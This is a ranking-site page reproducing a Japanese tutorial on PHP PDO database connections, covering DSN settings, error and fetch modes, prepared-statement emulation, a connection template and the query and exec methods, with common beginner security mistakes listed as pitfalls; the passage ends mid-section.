<html>
	<head><!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-110075493-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'UA-110075493-1');
</script>
<!-- Google AdSense -->
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
  (adsbygoogle = window.adsbygoogle || []).push({
    google_ad_client: "ca-pub-6168511236629369",
    enable_page_level_ads: true
  });
</script>

		<meta charset="UTF-8" />
		<title>Qiita Ranking (mpyw)</title>
		<link rel="stylesheet" type="text/css" href="../qranking.css">
	</head>
	<body>
<div class="headerContainer">
<h1>Qiitaいいね数ランキング (mpyw さんの投稿分)</h1>
</div><!--class="headerContainer"-->
<p><i><img width="16" height="16" src="../thumb-up-120px.png" /></i>が同じ値の場合は投稿日時の新しいものが上位としています。</p>
<p><i><img width="16" height="16" src="../thumb-up-120px.png" /></i>がついていない記事は表示していません。</p>
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />1位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>2051</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/b00b72c5c95aac573b71">PHPでデータベースに接続するときのまとめ</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-08-26 21:52:59</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[MySQL]</b> <b>[PDO]</b> <b>[データベース]</b> <b>[セキュリティ]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="あらかじめ読んでおきたい記事" class="fragment"></span><a href="#%E3%81%82%E3%82%89%E3%81%8B%E3%81%98%E3%82%81%E8%AA%AD%E3%82%93%E3%81%A7%E3%81%8A%E3%81%8D%E3%81%9F%E3%81%84%E8%A8%98%E4%BA%8B"><i class="fa fa-link"></i></a>あらかじめ読んでおきたい記事</h1>

<ul>
<li>
<a href="http://qiita.com/7968/items/6f089fec8dde676abb5b" id="reference-d1bd8c285818d9fe20ce">Qiita - 【PHP超入門】クラス～例外処理～PDOの基礎</a> by <a href="/7968" class="user-mention js-hovercard" title="7968" data-hovercard-target-type="user" data-hovercard-target-name="7968">@7968</a> </li>
</ul>

<h1>
<span id="初心者がやりがちなミス" class="fragment"></span><a href="#%E5%88%9D%E5%BF%83%E8%80%85%E3%81%8C%E3%82%84%E3%82%8A%E3%81%8C%E3%81%A1%E3%81%AA%E3%83%9F%E3%82%B9"><i class="fa fa-link"></i></a>初心者がやりがちなミス</h1>

<p>以下のどれかに1つでも当てはまるコードは見直す必要があります．付録にリンクを貼っておきましたので，「該当するかも？」という人はクリックして飛んで読んでください．太字にしてあるものは<ins>脆弱性に直結する危険度の高いもの</ins>です．</p>

<ul>
<li><a href="#mysql_query-%E3%81%AA%E3%81%A9%E3%81%AE%E9%9D%9E%E6%8E%A8%E5%A5%A8%E9%96%A2%E6%95%B0%E3%82%92%E5%88%A9%E7%94%A8%E3%81%97%E3%81%A6%E3%81%84%E3%82%8B"><code>mysql_query</code> などの非推奨関数を利用している</a></li>
<li><a href="#set-names-%E3%81%82%E3%82%8B%E3%81%84%E3%81%AF-set-character-set-%E3%81%AA%E3%81%A9%E3%81%A7%E6%96%87%E5%AD%97%E3%82%B3%E3%83%BC%E3%83%89%E3%82%92%E6%8C%87%E5%AE%9A%E3%81%97%E3%81%A6%E3%81%84%E3%82%8B%E3%81%9D%E3%82%82%E3%81%9D%E3%82%82%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E3%81%A7%E4%BD%BF%E7%94%A8%E3%81%99%E3%82%8B%E6%96%87%E5%AD%97%E3%82%B3%E3%83%BC%E3%83%89%E3%81%AE%E6%8C%87%E5%AE%9A%E3%82%92%E3%81%97%E3%81%A6%E3%81%84%E3%81%AA%E3%81%84"><code>SET NAMES</code> あるいは <code>SET CHARACTER SET</code> などで文字コードを指定している<br>そもそもデータベースで使用する文字コードの指定をしていない</a></li>
<li><strong><a href="#select--from-users-where-id--id-%E3%81%AE%E3%82%88%E3%81%86%E3%81%AB%E5%A4%89%E6%95%B0%E5%B1%95%E9%96%8B%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%A6sql%E6%96%87%E3%82%92%E7%B5%84%E3%81%BF%E7%AB%8B%E3%81%A6%E3%81%A6%E3%81%84%E3%82%8B"><code>"SELECT * FROM users WHERE id = '$id'"</code> のように変数展開を使ってSQL文を組み立てている</a></strong></li>
<li><a href="#_postid-%E3%81%AA%E3%81%A9%E3%81%AE%E5%A4%96%E9%83%A8%E5%85%A5%E5%8A%9B%E3%81%8B%E3%82%89%E3%81%8D%E3%81%9F%E5%A4%89%E6%95%B0%E3%81%8C%E5%AE%9A%E7%BE%A9%E3%81%95%E3%82%8C%E3%81%A6%E3%81%84%E3%82%8B%E3%81%8B%E3%81%A9%E3%81%86%E3%81%8B%E7%A2%BA%E8%AA%8D%E3%81%97%E3%81%A6%E3%81%84%E3%81%AA%E3%81%84%E3%81%9D%E3%82%8C%E3%82%89%E3%81%8C%E6%96%87%E5%AD%97%E5%88%97%E3%81%A7%E3%81%82%E3%82%8B%E3%81%8B%E3%81%A9%E3%81%86%E3%81%8B%E3%81%AE%E7%A2%BA%E8%AA%8D%E3%82%92%E3%81%97%E3%81%A6%E3%81%84%E3%81%AA%E3%81%84%E3%81%9D%E3%82%8C%E3%82%89%E3%82%92%E5%87%BA%E5%8A%9B%E3%81%99%E3%82%8B%E9%9A%9B%E3%81%AB-htmlspecialchars-%E9%96%A2%E6%95%B0%E3%82%92%E5%88%A9%E7%94%A8%E3%81%97%E3%81%A6%E3%81%84%E3%81%AA%E3%81%84"><code>$_POST['id']</code> などの外部入力からきた変数が定義されているかどうか確認していない<br>それらが文字列であるかどうかの確認をしていない<br><strong>それらを出力する際に <code>htmlspecialchars</code> 関数を利用していない</strong></a></li>
<li><a href="#sql%E3%81%AE-like-%E6%BC%94%E7%AE%97%E5%AD%90%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%A6%E3%81%84%E3%82%8B%E3%81%AE%E3%81%AB--_--%E3%81%AE%E3%82%A8%E3%82%B9%E3%82%B1%E3%83%BC%E3%83%97%E3%82%92%E3%81%97%E3%81%A6%E3%81%84%E3%81%AA%E3%81%84">SQLの <code>LIKE</code> 演算子を使っているのに <code>%</code> <code>_</code> <code>\</code> のエスケープをしていない</a></li>
<li><a href="#html%E3%81%AE-bodybody-%E3%81%AE%E4%B8%AD%E3%81%AB%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E6%8E%A5%E7%B6%9A%E5%87%A6%E7%90%86%E3%82%92%E6%9B%B8%E3%81%84%E3%81%A6%E3%81%84%E3%82%8Becho-%E3%82%84-print-%E3%82%92%E3%83%99%E3%82%BF%E6%9B%B8%E3%81%8D%E3%81%97%E3%81%A6%E3%81%84%E3%82%8Bcontent-type%E3%82%92-textplain-%E3%81%AB%E5%A4%89%E6%9B%B4%E3%81%9B%E3%81%9A%E3%81%AB-exit-%E3%82%84-die-%E3%81%A7%E5%BC%B7%E5%88%B6%E7%B5%82%E4%BA%86%E5%87%A6%E7%90%86%E3%82%92%E8%A8%98%E8%BF%B0%E3%81%97%E3%81%A6%E3%81%84%E3%82%8B">HTMLの <code>&lt;body&gt;&lt;/body&gt;</code> の中にデータベース接続処理を書いている<br><code>echo()</code> や <code>print()</code> をベタ書きしている<br>Content-Typeを <code>text/plain</code> に変更せずに <code>exit()</code> や <code>die()</code> で強制終了処理を記述している</a></li>
</ul>

<h1>
<span id="pdoの基本" class="fragment"></span><a href="#pdo%E3%81%AE%E5%9F%BA%E6%9C%AC"><i class="fa fa-link"></i></a>PDOの基本</h1>

<p>PHPでデータベースに接続するためには，現在はPDOを使う方法が主流であると言えるでしょう．PDOの基本的な使い方を確認していきます．内容によって，「前でさらっと書いてあることの定義が後で出てくる」など，どうしても多少前後してしまう部分はありますが，特に気にせずに読み流してください．</p>

<h2>
<span id="データベースに接続" class="fragment"></span><a href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AB%E6%8E%A5%E7%B6%9A"><i class="fa fa-link"></i></a>データベースに接続</h2>

<p><a href="http://php.net/manual/ja/pdo.construct.php" rel="nofollow noopener" target="_blank">PDO::__construct</a> メソッドを使用してインスタンスを生成します．コンストラクタなので，実際には直接これを呼び出すコードは書かずに， <strong>new演算子</strong> を用います．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$pdo</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span><span class="nv">$dsn</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$driver_options</span><span class="p">);</span>
</pre></div></div>

<p>引数は以下の通りです．</p>

<h3>
<span id="dsn" class="fragment"></span><a href="#dsn"><i class="fa fa-link"></i></a><code>$dsn</code>
</h3>

<p>データベースに接続するために必要な情報です． (Data Source Name)<br>
以下に各データベース製品に応じたDSNの書き方が掲載されています．</p>

<ul>
<li><a href="http://www.php.net/manual/ja/pdo.drivers.php" rel="nofollow noopener" target="_blank">PHP Manual - PDOクラスのデータベース別DSN一覧</a></li>
</ul>

<p>MySQLの基本的な書き方を例に挙げます．</p>

<p><strong><code>mysql:dbname=test;host=localhost;charset=utf8mb4</code></strong></p>

<ul>
<li>頭にデータベースの種類を指定して <code>:</code> で区切る．</li>
<li>各項目は <code>項目名=値</code> とし， <code>;</code> で区切る．</li>
</ul>

<h4>
<span id="dbname" class="fragment"></span><a href="#dbname"><i class="fa fa-link"></i></a><font color="silver">dbname</font>
</h4>

<p>データベース名を指定します．基本的には必須です．但し，データベースを後で <code>USE test</code> のようにSQL文で選択する場合，省略することができます．</p>

<h4>
<span id="host" class="fragment"></span><a href="#host"><i class="fa fa-link"></i></a><font color="silver">host</font>
</h4>

<p>ホスト名またはIPアドレスを指定します．ローカル環境で動かす場合，省略しても問題ない場合が多いです．<code>localhost</code> は自分自身のホスト名， <code>127.0.0.1</code> は自分自身のIPアドレスを指します．どちらを用いても問題が発生する可能性があるので，適宜問題のない方を選択してください．</p>

<ul>
<li>Linux環境はホスト名推奨

<ul>
<li><a href="http://qiita.com/mpyw/items/b00b72c5c95aac573b71#comment-e9db50fff9bffa1dd6f8">upsilonさん: MySQLではlocalhostと127.0.0.1で接続方法が変わるため注意が必要</a></li>
</ul>
</li>
<li>Windows環境はIPアドレス推奨

<ul>
<li><a href="http://www.ah-2.com/2012/01/28/win_localhost_slow.html" rel="nofollow noopener" target="_blank">AH-2 - Windowsでlocalhostへの接続が遅い(解決方法)</a></li>
</ul>
</li>
</ul>

<h4>
<span id="charset" class="fragment"></span><a href="#charset"><i class="fa fa-link"></i></a><font color="silver">charset</font>
</h4>

<p>文字セットを指定します．<code>SET NAMES</code>は避けて，ここで指定するべきです．<code>UTF-8</code>ではなく<code>utf8</code>であることに注意してください．ハイフンは入りません．</p>

<p><strong>【2016/12/17 追記】</strong><br>
<strong>MySQL5.5.3以降の場合は，4バイトからなる絵文字なども正常に取り扱える<code>utf8mb4</code>を使用することを強く推奨します。</strong></p>

<h3>
<span id="username" class="fragment"></span><a href="#username"><i class="fa fa-link"></i></a><code>$username</code>
</h3>

<p>ユーザー名．ルート権限を使う場合，デフォルトでは <code>root</code> です．</p>

<h3>
<span id="password" class="fragment"></span><a href="#password"><i class="fa fa-link"></i></a><code>$password</code>
</h3>

<p>パスワード．ルート権限を使う場合，デフォルトでは空白です．</p>

<h3>
<span id="driver_options" class="fragment"></span><a href="#driver_options"><i class="fa fa-link"></i></a><code>$driver_options</code>
</h3>

<p>接続時のオプションを連想配列で渡します．</p>

<ul>
<li>キーはあらかじめ用意されている定数を取る．</li>
<li>値はあらかじめ用意されている定数以外に，論理値・文字列などの一般的な値も取り得る．</li>
</ul>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="p">[</span>
    <span class="nx">PDO</span><span class="o">::</span><span class="na">ATTR_ERRMODE</span> <span class="o">=&gt;</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">ERRMODE_EXCEPTION</span><span class="p">,</span>
    <span class="nx">PDO</span><span class="o">::</span><span class="na">ATTR_EMULATE_PREPARES</span> <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span>
<span class="p">]</span>
</pre></div></div>

<p>オプションの内容については後で触れます．</p>

<h2>
<span id="接続後にオプションを指定" class="fragment"></span><a href="#%E6%8E%A5%E7%B6%9A%E5%BE%8C%E3%81%AB%E3%82%AA%E3%83%97%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92%E6%8C%87%E5%AE%9A"><i class="fa fa-link"></i></a>接続後にオプションを指定</h2>

<p><a href="http://www.php.net/manual/ja/pdo.setattribute.php" rel="nofollow noopener" target="_blank">PDO::setAttribute</a> メソッドを使用します．多くのオプションはコンストラクタの <code>$driver_options</code> で指定してもこちらで指定しても大差はありませんが， <code>PDO::MYSQL_ATTR_INIT_COMMAND</code> <code>PDO::ATTR_PERSISTENT</code> など，一部コンストラクタ専用のものがあります．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">setAttribute</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">ATTR_ERRMODE</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">ERRMODE_EXCEPTION</span><span class="p">);</span>
<span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">setAttribute</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">ATTR_EMULATE_PREPARES</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
</pre></div></div>

<h2>
<span id="よく使われるドライバオプションとその値" class="fragment"></span><a href="#%E3%82%88%E3%81%8F%E4%BD%BF%E3%82%8F%E3%82%8C%E3%82%8B%E3%83%89%E3%83%A9%E3%82%A4%E3%83%90%E3%82%AA%E3%83%97%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%A8%E3%81%9D%E3%81%AE%E5%80%A4"><i class="fa fa-link"></i></a>よく使われるドライバオプションとその値</h2>

<h3>
<span id="pdoattr_errmode" class="fragment"></span><a href="#pdoattr_errmode"><i class="fa fa-link"></i></a><code>PDO::ATTR_ERRMODE</code>
</h3>

<p>SQL実行でエラーが起こった際にどう処理するかを指定します．デフォルトは <code>PDO::ERRMODE_SILENT</code> です．</p>

<ul>
<li>
<strong><code>PDO::ERRMODE_EXCEPTION</code></strong> を設定すると例外をスローしてくれる．これを選択しておくのが一番無難．</li>
<li>
<code>PDO::ERRMODE_WARNING</code> はSQLで発生したエラーをPHPのWarningとして報告する．<br><ins><a href="http://www.php.net/manual/ja/pdostatement.execute.php" rel="nofollow noopener" target="_blank">PDOStatement::execute</a> メソッドの返り値が <code>false</code> でないかを毎回のように確認する必要がある</ins>．</li>
<li>
<code>PDO::ERRMODE_SILENT</code> は何も報告しない．<br><ins><a href="http://www.php.net/manual/ja/pdostatement.execute.php" rel="nofollow noopener" target="_blank">PDOStatement::execute</a> メソッドの返り値が <code>false</code> でないかを毎回のように確認する必要がある</ins>．</li>
</ul>

<h3>
<span id="pdoattr_default_fetch_mode" class="fragment"></span><a href="#pdoattr_default_fetch_mode"><i class="fa fa-link"></i></a><code>PDO::ATTR_DEFAULT_FETCH_MODE</code>
</h3>

<p><a href="http://www.php.net/manual/ja/pdostatement.fetch.php" rel="nofollow noopener" target="_blank">PDOStatement::fetch</a> メソッドや <a href="http://www.php.net/manual/ja/pdostatement.fetchall.php" rel="nofollow noopener" target="_blank">PDOStatement::fetchAll</a> メソッドで引数が省略された場合や，ステートメントがforeach文に直接かけられた場合のフェッチスタイルを設定します．デフォルトは<code>PDO::FETCH_BOTH</code>です．</p>

<ul>
<li>
<code>PDO::FETCH_BOTH</code><br>
カラム番号とカラム名の両方をキーとする連想配列で取得する．</li>
<li>
<code>PDO::FETCH_NUM</code><br>
カラム番号をキーとする配列で取得する．</li>
<li>
<strong><code>PDO::FETCH_ASSOC</code></strong><br>
カラム名をキーとする連想配列で取得する．これが一番ポピュラーな設定．</li>
<li>
<code>PDO::FETCH_OBJ</code><br>
カラム名をプロパティとする基本オブジェクトで取得する．</li>
</ul>

<h3>
<span id="pdoattr_emulate_prepares" class="fragment"></span><a href="#pdoattr_emulate_prepares"><i class="fa fa-link"></i></a><code>PDO::ATTR_EMULATE_PREPARES</code>
</h3>

<p>データベース側が持つ「プリペアドステートメント」という機能のエミュレーションをPDO側で行うかどうかを設定します．</p>

<ul>
<li>PHP5.1のデフォルトは <code>false</code>
</li>
<li><ins>PHP5.2以降のデフォルトは <code>true</code></ins></li>
</ul>

<p>この設定で，いくつかPDOの挙動に違いが表れます．</p>

<ul>
<li>プリペアドステートメントのためにデータベースサーバと通信する必要が無くなるため，エミュレーションを行ったほうがパフォーマンスは向上する．</li>
<li>存在しないテーブル名やカラム名をSQL文に持つプリペアドステートメントを発行したとき，エミュレーションOFFの場合はすぐにエラーが発生するが，エミュレーションONの場合は実際にクエリを実行するまでエラーが発生するかどうかわからない．</li>
<li>エミュレーションがONの場合のみ， <code>;</code> 区切りで複数のSQL文を1つのクエリで実行することができる．</li>
</ul>

<p>その他，どちらにも利点と欠点があるので，違いは追って見ていき，最後に表にまとめることにします．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PDOクラスのエミュレーションを無効にする</span></div>
<div class="highlight"><pre><span></span><span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">setAttribute</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">ATTR_EMULATE_PREPARES</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
</pre></div>
</div>

<h3>
<span id="pdoattr_persistent-コンストラクタ専用" class="fragment"></span><a href="#pdoattr_persistent-%E3%82%B3%E3%83%B3%E3%82%B9%E3%83%88%E3%83%A9%E3%82%AF%E3%82%BF%E5%B0%82%E7%94%A8"><i class="fa fa-link"></i></a><code>PDO::ATTR_PERSISTENT</code> (コンストラクタ専用)</h3>

<p><code>true</code> を設定すると，スクリプトが終了してもデータベースへの接続を維持し，次回に再利用します．規模が大きくなってくると設定する恩恵が大きくなりますが，ほそぼそと練習用サイトを作っているうちは役に立たないでしょう．</p>

<h3>
<span id="pdomysql_attr_use_buffered_query-mysql専用" class="fragment"></span><a href="#pdomysql_attr_use_buffered_query-mysql%E5%B0%82%E7%94%A8"><i class="fa fa-link"></i></a><code>PDO::MYSQL_ATTR_USE_BUFFERED_QUERY</code> (MySQL専用)</h3>

<p><code>true</code> のとき， バッファクエリを使用します．デフォルト値はバージョンによって異なるようで，不明です．PHP5.3の時代には既にデフォルトが <code>true</code> で今も変わっていない…？少なくとも，私が確認できる限りの最近バージョンではデフォルトは <code>true</code> です．</p>

<ul>
<li>
<strong>バッファクエリ</strong>:<br>全ての情報をデータベースサーバから取得してきておいて，PHPに1件ずつ取り出させる</li>
<li>
<strong>非バッファクエリ</strong>:<br>1件ごとにデータベースサーバと通信を行って，PHPに取り出させる</li>
</ul>

<p>取得してくる情報がメモリに収まりきらない莫大な量である，といった非常に特殊なケースを除けば，バッファクエリを選択しておく方が無難です．サーバ負荷も軽減され，途中までフェッチしたところで突然例外が発生するような事態も避けられます．また，非バッファクエリには複数同時にクエリを実行できないなどの大きな欠点もあります．基本的にこれは，データベースから取得したデータでHTMLを表示する用途ではなく，<ins>コマンドラインからバッチ処理を実行する</ins>用途で使われます．</p>

<h3>
<span id="pdomysql_attr_init_command-mysql専用-コンストラクタ専用" class="fragment"></span><a href="#pdomysql_attr_init_command-mysql%E5%B0%82%E7%94%A8-%E3%82%B3%E3%83%B3%E3%82%B9%E3%83%88%E3%83%A9%E3%82%AF%E3%82%BF%E5%B0%82%E7%94%A8"><i class="fa fa-link"></i></a><code>PDO::MYSQL_ATTR_INIT_COMMAND</code> (MySQL専用) (コンストラクタ専用)</h3>

<p>接続した直後に実行されるクエリをここに書きます．</p>

<h2>
<span id="基本コーディング" class="fragment"></span><a href="#%E5%9F%BA%E6%9C%AC%E3%82%B3%E3%83%BC%E3%83%87%E3%82%A3%E3%83%B3%E3%82%B0"><i class="fa fa-link"></i></a>基本コーディング</h2>

<p>書き方のテンプレです．</p>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="k">try</span> <span class="p">{</span>

    <span class="cm">/* リクエストから得たスーパーグローバル変数をチェックするなどの処理 */</span>

    <span class="c1">// データベースに接続</span>
    <span class="nv">$pdo</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span>
        <span class="s1">'mysql:dbname=testdb;host=localhost;charset=utf8mb4'</span><span class="p">,</span>
        <span class="s1">'root'</span><span class="p">,</span>
        <span class="s1">''</span><span class="p">,</span>
        <span class="p">[</span>
            <span class="nx">PDO</span><span class="o">::</span><span class="na">ATTR_ERRMODE</span> <span class="o">=&gt;</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">ERRMODE_EXCEPTION</span><span class="p">,</span>
            <span class="nx">PDO</span><span class="o">::</span><span class="na">ATTR_DEFAULT_FETCH_MODE</span> <span class="o">=&gt;</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_ASSOC</span><span class="p">,</span>
        <span class="p">]</span>
    <span class="p">);</span>

    <span class="cm">/* データベースから値を取ってきたり， データを挿入したりする処理 */</span>

<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">PDOException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>

    <span class="c1">// エラーが発生した場合は「500 Internal Server Error」でテキストとして表示して終了する</span>
    <span class="c1">// - もし手抜きしたくない場合は普通にHTMLの表示を継続する</span>
    <span class="c1">// - ここではエラー内容を表示しているが， 実際の商用環境ではログファイルに記録して， Webブラウザには出さないほうが望ましい</span>
    <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: text/plain; charset=UTF-8'</span><span class="p">,</span> <span class="k">true</span><span class="p">,</span> <span class="mi">500</span><span class="p">);</span>
    <span class="k">exit</span><span class="p">(</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">());</span> 

<span class="p">}</span>

<span class="c1">// Webブラウザにこれから表示するものがUTF-8で書かれたHTMLであることを伝える</span>
<span class="c1">// (これか &lt;meta charset="utf-8"&gt; の最低限どちらか1つがあればいい． 両方あっても良い．)</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: text/html; charset=utf-8'</span><span class="p">);</span>

<span class="cp">?&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">"utf-8"</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Example<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
        <span class="c">&lt;!-- ここではHTMLを書く以外のことは一切しない --&gt;</span>
    <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div></div>

<h3>
<span id="参考-コンストラクタでのエラーモードってどうなるの" class="fragment"></span><a href="#%E5%8F%82%E8%80%83-%E3%82%B3%E3%83%B3%E3%82%B9%E3%83%88%E3%83%A9%E3%82%AF%E3%82%BF%E3%81%A7%E3%81%AE%E3%82%A8%E3%83%A9%E3%83%BC%E3%83%A2%E3%83%BC%E3%83%89%E3%81%A3%E3%81%A6%E3%81%A9%E3%81%86%E3%81%AA%E3%82%8B%E3%81%AE"><i class="fa fa-link"></i></a>参考: コンストラクタでのエラーモードってどうなるの？</h3>

<p>PDOのコンストラクタは <code>PDO::ERRMODE_EXCEPTION</code> の有無に関わらず <strong>PDOException</strong> をスローしますが， <ins>ホストに接続できなかった</ins>場合などに <strong>Warning</strong> を発生します．普通は気に留める必要はありませんが，ホストを動的に指定させるようなプログラムを書いているならば， <a href="http://www.php.net/manual/ja/function.set-error-handler.php" rel="nofollow noopener" target="_blank">set_error_handler</a> 関数を使って <strong>ErrorException</strong> に変換しなければ，例外処理を行うことができません．</p>

<h2>
<span id="pdoquery-メソッドで直接クエリを実行する" class="fragment"></span><a href="#pdoquery-%E3%83%A1%E3%82%BD%E3%83%83%E3%83%89%E3%81%A7%E7%9B%B4%E6%8E%A5%E3%82%AF%E3%82%A8%E3%83%AA%E3%82%92%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a><a href="http://www.php.net/manual/ja/pdo.query.php" rel="nofollow noopener" target="_blank">PDO::query</a> メソッドで直接クエリを実行する</h2>

<p>ユーザー入力を伴わないクエリに関しては単に <a href="http://www.php.net/manual/ja/pdo.query.php" rel="nofollow noopener" target="_blank">PDO::query</a> メソッドを実行すればいいだけです．返り値は <strong>PDOStatement</strong> となります．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">全員を取得する</span></div>
<div class="highlight"><pre><span></span><span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">'SELECT * FROM users'</span><span class="p">);</span>
</pre></div>
</div>

<h2>
<span id="pdoexec-メソッドで直接クエリを実行する" class="fragment"></span><a href="#pdoexec-%E3%83%A1%E3%82%BD%E3%83%83%E3%83%89%E3%81%A7%E7%9B%B4%E6%8E%A5%E3%82%AF%E3%82%A8%E3%83%AA%E3%82%92%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a><a href="http://www.php.net/manual/ja/pdo.exec.php" rel="nofollow noopener" target="_blank">PDO::exec</a> メソッドで直接クエリを実行する</h2>

<p>ユーザー入力を伴わないクエリで， <strong>INSERT</strong> や <strong>UPDATE</strong> 等で作用した件数を直接返り値に欲しい場合は <a href="http://www.php.net/manual/ja/pdo.exec.php" rel="nofollow noopener" target="_blank">PDO::exec</a> メソッドを代わりに使います．特に結果を必要としない場合においてもこちらを使用すべきです．後に登場する <a href="http://www.php.net/manual/ja/pdostatement.execute.php" rel="nofollow noopener" target="_blank">PDOStatement::execute</a> と紛らわしいので注意してください．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">全員の年齢を+1し，その対象となった人数を返り値として取得する</span></div>
<div class="highlight"><pre><span></span><span class="nv">$count</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">exec</span><span class="p">(</span><span class="s1">'UPDATE users SET age = age + 1'</span><span class="p">);</span>
</pre></div>
</div>

<h2>
<span id="pdoprepare--pdostatementbindvalue--pdostatementexecute-の3ステップでクエリを実行する" class="fragment"></span><a href="#pdoprepare--pdostatementbindvalue--pdostatementexecute-%E3%81%AE3%E3%82%B9%E3%83%86%E3%83%83%E3%83%97%E3%81%A7%E3%82%AF%E3%82%A8%E3%83%AA%E3%82%92%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a><a href="http://www.php.net/manual/ja/pdo.prepare.php" rel="nofollow noopener" target="_blank">PDO::prepare</a> → <a href="http://www.php.net/manual/ja/pdostatement.bindvalue.php" rel="nofollow noopener" target="_blank">PDOStatement::bindValue</a> → <a href="http://www.php.net/manual/ja/pdostatement.execute.php" rel="nofollow noopener" target="_blank">PDOStatement::execute</a> の3ステップでクエリを実行する</h2>

<p>ユーザー入力を受け取ってSQL文を動的に生成する場合は <strong>プリペアドステートメント</strong> と <strong>プレースホルダ</strong> を使わなければなりません．</p>

<ul>
<li>
<strong>プレースホルダ</strong>:<br>直訳すると「場所取り」．何かユーザ入力を当てはめる場所としてあらかじめ確保しておくもの．</li>
<li>
<strong>プリペアドステートメント</strong>:<br>直訳すると「予約文」．文を予約したもの．通常，「予約文」は「場所取り」を使うために作られる．もし「場所取り」が無ければ普通に <a href="http://www.php.net/manual/ja/pdo.query.php" rel="nofollow noopener" target="_blank">PDO::query</a> などで実行するだけで十分なためである．</li>
</ul>

<p>プレースホルダには2種類あり，<strong>疑問符プレースホルダ</strong> を使う方法と， <strong>名前付きプレースホルダ</strong> を使う方法があります．もしこれらが混ざってしまうと</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>SQLSTATE[HY093]: Invalid parameter number: mixed named and positional parameters
</pre></div></div>

<p>が発生するので，どちらか一方のみを選択してください．</p>

<h3>
